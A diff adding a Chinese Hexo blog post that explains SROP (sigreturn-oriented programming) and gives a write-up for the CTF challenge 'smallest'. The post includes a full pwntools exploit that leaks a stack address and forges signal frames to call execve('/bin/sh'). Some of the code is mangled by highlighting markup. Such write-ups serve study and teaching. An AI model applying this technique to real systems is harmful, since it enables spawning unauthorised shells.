@@ -1,0 +1,1161 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Linux," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="4ct10n's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。">
+<meta name="keywords" content="Linux">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux SROP 原理与攻击">
+<meta property="og:url" content="http://yoursite.com/2017/06/30/Linux SROP 原理与攻击/index.html">
+<meta property="og:site_name" content="4ct10n&#39;s Blog">
+<meta property="og:description" content="理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://img.blog.csdn.net/20170630004342751?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170630011456220?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170630012948485?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:image" content="http://img.blog.csdn.net/20170630013035130?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+<meta property="og:updated_time" content="2017-10-22T02:14:24.999Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux SROP 原理与攻击">
+<meta name="twitter:description" content="理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。">
+<meta name="twitter:image" content="http://img.blog.csdn.net/20170630004342751?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/06/30/Linux SROP 原理与攻击/"/>
+
+
+
+
+
+  <title>Linux SROP 原理与攻击 | 4ct10n's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">4ct10n's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br />
+            
+            日程表
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-commonweal">
+          <a href="/404/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
+            
+            公益404
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/30/Linux SROP 原理与攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="4ct10n">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/qq.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="4ct10n's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Linux SROP 原理与攻击</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-30T01:34:00+08:00">
+                2017-06-30
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2017-10-22T10:14:24+08:00">
+                2017-10-22
+              </time>
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章<a href="http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。</a><br><a id="more"></a></p>
+<p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p>
+<div class="markdown_views"><blockquote><br><p>理解并掌握基本的SROP理论以及其攻击方法，这里主要结合freebuf的文章<a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html</a>，以及i春秋360杯和2017广东省红帽杯的题目路整理一下思路。</p><br></blockquote><br><h1 id="0x01-原理">0x01 原理</h1><br><blockquote><br><p>SROP的全称是Sigreturn Oriented Programming。在这里<code>sigreturn</code>是一个系统调用，它在unix系统发生signal的时候会被间接地调用。</p><br><p>Signal这套机制在1970年代就被提出来并整合进了UNIX内核中，它在现在的操作系统中被使用的非常广泛，比如内核要杀死一个进程（<code>kill -9 $PID</code>），再比如为进程设置定时器，或者通知进程一些异常事件等等。</p><br><p>当内核向某个进程发起（deliver）一个signal，该进程会被暂时挂起（suspend），进入内核（1），然后内核为该进程保存相应的上下文，跳转到之前注册好的signal handler中处理相应signal（2），当signal handler返回之后（3），内核为该进程恢复之前保存的上下文，最后恢复进程的执行（4）。</p><br></blockquote><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630004342751?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>在这里我们主要理解sigreturn的意义是，去执行一段pop函数将堆栈中的值全部pop到寄存器中，相当于一个恢复现场的作用（攻击的时候主要运用的这一点）。</p><br><p>在这四步过程中，第三步是关键，即如何使得用户态的signal handler执行完成之后能够顺利返回内核态。在类UNIX的各种不同的系统中，这个过程有些许的区别，但是大致过程是一样的。这里以Linux为例： <br><br>在第二步的时候，内核会帮用户进程将其上下文保存在该进程的栈上，然后在栈顶填上一个地址<code>rt_sigreturn</code>，这个地址指向一段代码，在这段代码中会调用<code>sigreturn</code>系统调用。因此，当signal handler执行完之后，栈指针（stack pointer）就指向<code>rt_sigreturn</code>，所以，signal handler函数的最后一条<code>ret</code>指令会使得执行流跳转到这段sigreturn代码，被动地进行<code>sigreturn</code>系统调用。下图显示了栈上保存的用户进程上下文、signal相关信息，以及<code>rt_sigreturn</code>： <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630011456220?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>我们将这段内存称为一个<code>Signal Frame</code>。<br><br><br></p><br><h1 id="0x02-攻击利用">0x02 攻击利用</h1><br><h2 id="0x1攻击流程">0x1攻击流程</h2><br><p>如果理解了前面所描述的原理，那么利用方式很简单，直接篡改在堆栈中的数据，等到sigreturn的时候就可以大展伸手了。 <br><br>攻击利用这一点 swing师傅已经写了<a href="http://bestwing.me/2017/03/20/stack-overflow-three-SROP/" target="_blank" rel="external">传送门</a><br></p><br><h2 id="0x2-题目解析">0x2 题目解析</h2><br><p>在这里我主要分析一道ctf题目，i春秋360比赛的<strong>smallest</strong> <br><br>拿到题目首先分析结构 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630012948485?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>三无产品 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170630013035130?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br><br><br><br></p><br><p>这里看到syscall，就想到用SROP技术</p><br><p>syscall这个指令，它是根据rax寄存器的值来查询系统调用表，并执行对应函数。 <br><br><code>syscall(rax,rdi,rsi,rdx)</code> <br><br>我们看看反汇编代码的意思 <br><br><code>syscall(0,0,$rsp,0x400)</code>，相当于调用了read函数<code>read(0,$rsp,0x400)</code><br><br><br></p><br><h3 id="1-target">1. target</h3><br><p>我们要最终获取shell权限，必须有写入<code>“/bin/bash”</code>的过程所以要用到read函数。 <br><br>要有命令执行过程所以要有exec <br><br>要有固定的字符串地址所以要有地址泄露 这里是write函数<br><br></p><br><ol><br><li>因为write函数的系统调用编号是1所以可以直接跳转绕过<code>xor ax，ax</code> <br><br>使得第二次函数执行write函数<br></li><br><li>下面需要frame结构写到栈里，但最后要调用sigreturn指令，所以这里要提前做好栈保留的工作，这里有个坑看了半天才看懂，最后的解释感觉还可以接受</li><br></ol><br><p>其他的工作倒没什么了，主要是理清思路，要知道代码中每一行是干什么的</p><br><h3 id="2write函数地址泄露">2.write函数地址泄露</h3><br><p>这里我们选用write函数的原因很简单就是因为系统调用ax=1时是write函数，所以这里选用它 <br><br>代码如下<br></p><br><pre class="prettyprint"><code class=" hljs sql">from pwn import <em><br>sh = process(“./pwn4”)<br><br><span class="hljs-operator"><span class="hljs-keyword">begin</span> = <span class="hljs-number">0x4000b0</span><br>syscall = <span class="hljs-number">0x4000be</span><br># step <span class="hljs-number">1</span> <span class="hljs-keyword">call</span> <span class="hljs-keyword">write</span> func <span class="hljs-keyword">to</span> leak stack addr<br>write_payload = p64(<span class="hljs-keyword">begin</span>) + p64(<span class="hljs-keyword">begin</span>) + p64(<span class="hljs-keyword">begin</span>) #the sec place can be replaced <span class="hljs-keyword">by</span> <span class="hljs-number">0x4000b1</span> <span class="hljs-number">0x4000b2</span> why <span class="hljs-number">3</span> addr becaus  <span class="hljs-keyword">after</span> <span class="hljs-keyword">write</span> it went <span class="hljs-keyword">to</span> <span class="hljs-keyword">read</span> func<br>sh.send(write_payload)<br><br>sh.send(<span class="hljs-string">“\xb3”</span>)#attention can <span class="hljs-keyword">only</span> send <span class="hljs-number">1</span> byte <span class="hljs-keyword">to</span> <span class="hljs-keyword">call</span> <span class="hljs-keyword">write</span> func<br>stack_addr = u64(sh.recv()[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])<br>print hex(stack_addr)<br>sh.interactive()</span></em></code></pre><br><h2 id="3构造frame结构">3.构造frame结构</h2><br><p>这一步比较简单可以直接利用别人写好的框架SigreturnFrame <br><br>首先我们要构造一个read函数，作用是把我们输入的字符串放在已经泄露的栈地址上，这一步是为了写exec的frame和参数<code>/bin/bash</code><br></p><br><pre class="prettyprint"><code class=" hljs avrasm"><span class="hljs-preprocessor">#read(0,stack_addr,0x400) </span><br>frame = SigreturnFrame(kernel=<span class="hljs-string">“amd64”</span>)<br>frame = SigreturnFrame(kernel=<span class="hljs-string">“amd64”</span>)<br>frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_read<br>frame<span class="hljs-preprocessor">.rdi</span> = <span class="hljs-number">0x0</span><br>frame<span class="hljs-preprocessor">.rsi</span> = stack_addr<span class="hljs-preprocessor">#这里和下面@值必须相同，因为是一个rop链</span><br>frame<span class="hljs-preprocessor">.rdx</span> = <span class="hljs-number">0x400</span><br>frame<span class="hljs-preprocessor">.rsp</span> = stack_addr<span class="hljs-preprocessor">#@</span><br>frame<span class="hljs-preprocessor">.rip</span> = syscall</code></pre><br><pre class="prettyprint"><code class=" hljs avrasm">frame = SigreturnFrame(kernel=<span class="hljs-string">“amd64”</span>)<br>frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_execve<br>frame<span class="hljs-preprocessor">.rdi</span> = stack_addr+<span class="hljs-number">0x300</span> <span class="hljs-preprocessor"># “/bin/sh” ‘s addr </span><br>frame<span class="hljs-preprocessor">.rip</span> = syscall</code></pre><br><h2 id="4sigreturn执行">4.sigreturn执行</h2><br><p>这里需要前面的的预留位</p><br><pre class="prettyprint"><code class=" hljs livecodeserver">goto_sigreturn_payload = p64(syscall_addr) + <span class="hljs-string">“\x00”</span>(<span class="hljs-number">15</span> - <span class="hljs-number">8</span>) <span class="hljs-comment"># sigreturn syscall is 15 </span><br>s.<span class="hljs-built_in">send</span>(goto_sigreturn_payload)</code></pre><br><p>第一个是注册ax然后rop到syscall那里去执行sigreturn，恢复现场 <br><br>下面那个和这个功能一样<br></p><br><h2 id="5完整exp">5.完整exp</h2><br><pre class="prettyprint"><code class=" hljs http"><br><br><span class="avrasm">from pwn import <em><br>sh = process(<span class="hljs-string">“./pwn4”</span>)<br>context<span class="hljs-preprocessor">.arch</span> = <span class="hljs-string">“amd64”</span><br>begin = <span class="hljs-number">0x4000b0</span><br>syscall = <span class="hljs-number">0x4000be</span><br><span class="hljs-preprocessor"># step 1 call write func to leak stack addr</span><br>write_payload = p64(begin) + p64(begin) + p64(begin) <span class="hljs-preprocessor">#the sec place can be replaced by 0x4000b1 0x4000b2 why 3 addr becaus  after write it went to read func</span><br>sh<span class="hljs-preprocessor">.send</span>(write_payload)<br><br>sh<span class="hljs-preprocessor">.send</span>(<span class="hljs-string">“\xb3”</span>)<span class="hljs-preprocessor">#attention can only send 1 byte to call write func</span><br>stack_addr = u64(sh<span class="hljs-preprocessor">.recv</span>()[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])<br>print <span class="hljs-string">“stack_addr:”</span>,hex(stack_addr)<br><br><span class="hljs-preprocessor"># step 2 create frame struct</span><br><span class="hljs-preprocessor">#read(0,stack_addr,0x400) </span><br><br>frame = SigreturnFrame(kernel=<span class="hljs-string">“amd64”</span>)<br>frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_read<br>frame<span class="hljs-preprocessor">.rdi</span> = <span class="hljs-number">0x0</span><br>frame<span class="hljs-preprocessor">.rsi</span> = stack_addr<br>frame<span class="hljs-preprocessor">.rdx</span> = <span class="hljs-number">0x400</span><br>frame<span class="hljs-preprocessor">.rsp</span> = stack_addr<br>frame<span class="hljs-preprocessor">.rip</span> = syscall<br><br>read_payload = p64(begin)+p64(<span class="hljs-number">11111</span>)+str(frame)<br>sh<span class="hljs-preprocessor">.send</span>(read_payload)<br><span class="hljs-preprocessor">#step 3 excu sigreturn </span><br>sigreturn_payload = p64(syscall)+<span class="hljs-number">7</span></em><span class="hljs-string">“\x00”</span><br>sh<span class="hljs-preprocessor">.send</span>(sigreturn_payload)<br><br><span class="hljs-preprocessor">#step 4 create frame struct</span><br>frame = SigreturnFrame(kernel=<span class="hljs-string">“amd64”</span>)<br>frame<span class="hljs-preprocessor">.rax</span> = constants<span class="hljs-preprocessor">.SYS</span>_execve<br>frame<span class="hljs-preprocessor">.rdi</span> = stack_addr+<span class="hljs-number">0x300</span><br>frame<span class="hljs-preprocessor">.rip</span> = syscall<br><br>execv_frame_payload = p64(begin) + p64(<span class="hljs-number">1111</span>) + str(frame)<br><span class="hljs-preprocessor">#step 5 excu sigreturn </span><br>execv_frame_payload_all = execv_frame_payload + (<span class="hljs-number">0x300</span> - len(execv_frame_payload))*<span class="hljs-string">“\x00”</span> + <span class="hljs-string">“/bin/sh\x00”</span><br>sh<span class="hljs-preprocessor">.send</span>(execv_frame_payload_all)<br><br>sh<span class="hljs-preprocessor">.send</span>(sigreturn_payload)<br><br>sh<span class="hljs-preprocessor">.interactive</span>()</span></code></pre></div>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/06/29/漏洞分析之CVE-2012-4792(UAF)/" rel="next" title="漏洞分析之CVE-2012-4792(UAF)">
+                <i class="fa fa-chevron-left"></i> 漏洞分析之CVE-2012-4792(UAF)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/07/02/漏洞分析之CVE-2010-2883（栈溢出）/" rel="prev" title="漏洞分析之CVE-2010-2883（栈溢出）">
+                漏洞分析之CVE-2010-2883（栈溢出） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/qq.jpg"
+                alt="4ct10n" />
+            
+              <p class="site-author-name" itemprop="name">4ct10n</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/actionyz" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:act01n@163.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.google.com" target="_blank" title="Google">
+                    
+                      <i class="fa fa-fw fa-google"></i>Google</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="1792034533" target="_blank" title="QQ">
+                    
+                      <i class="fa fa-fw fa-QQ"></i>QQ</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-原理"><span class="nav-number">1.</span> <span class="nav-text">0x01 原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-攻击利用"><span class="nav-number">2.</span> <span class="nav-text">0x02 攻击利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x1攻击流程"><span class="nav-number">2.1.</span> <span class="nav-text">0x1攻击流程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x2-题目解析"><span class="nav-number">2.2.</span> <span class="nav-text">0x2 题目解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-target"><span class="nav-number">2.2.1.</span> <span class="nav-text">1. target</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2write函数地址泄露"><span class="nav-number">2.2.2.</span> <span class="nav-text">2.write函数地址泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3构造frame结构"><span class="nav-number">2.3.</span> <span class="nav-text">3.构造frame结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4sigreturn执行"><span class="nav-number">2.4.</span> <span class="nav-text">4.sigreturn执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5完整exp"><span class="nav-number">2.5.</span> <span class="nav-text">5.完整exp</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">4ct10n</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
